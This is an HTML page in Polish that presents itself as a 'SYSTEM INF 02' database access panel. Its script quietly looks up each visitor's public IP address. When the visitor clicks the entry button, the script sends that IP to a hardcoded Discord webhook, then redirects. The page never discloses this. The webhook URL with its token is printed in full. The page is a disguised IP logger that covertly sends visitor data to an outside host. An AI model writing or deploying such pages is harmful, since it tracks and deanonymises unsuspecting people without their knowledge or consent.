<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Dostępu</title>
    <style>
        /* Stylizacja tła i fontu */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }

        h1 {
            color: #bb86fc;
            margin-bottom: 10px;
        }

        #ip {
            font-size: 1.2rem;
            margin: 20px;
            color: #03dac6;
            background: #1e1e1e;
            padding: 10px 20px;
            border-radius: 8px;
            border: 1px solid #333;
        }

        /* Stylizacja przycisku */
        button {
            padding: 15px 30px;
            font-size: 18px;
            cursor: pointer;
            background-color: #bb86fc;
            color: #000;
            border: none;
            border-radius: 50px;
            font-weight: bold;
            transition: transform 0.2s, background-color 0.3s;
            box-shadow: 0 4px 15px rgba(187, 134, 252, 0.3);
        }

        button:hover {
            background-color: #9965f4;
            transform: scale(1.05);
        }

        button:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>

    <h1>SYSTEM INF 02</h1>
    <div id="ip">Inicjalizacja bazy danych...</div>

    <button onclick="sendToDiscord()">WEJDŹ DO BAZY</button>

    <script>
        let currentIP = "";

        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                currentIP = data.ip;
                document.getElementById("ip").textContent = "Status: Gotowe";
            })
            .catch(() => {
                document.getElementById("ip").textContent = "Błąd połączenia";
            });

        function sendToDiscord() {
            // Zmiana tekstu przycisku na "Ładowanie..." dla lepszego UX
            const btn = document.querySelector('button');
            btn.textContent = "Ładowanie...";
            btn.disabled = true;

            fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: "Użytkownik wszedł do bazy. IP: " + (currentIP || "Nieznane")
                })
            })
            .finally(() => {
                window.location.href = "index2.html"; 
            });
        }
    </script>
</body>
</html>
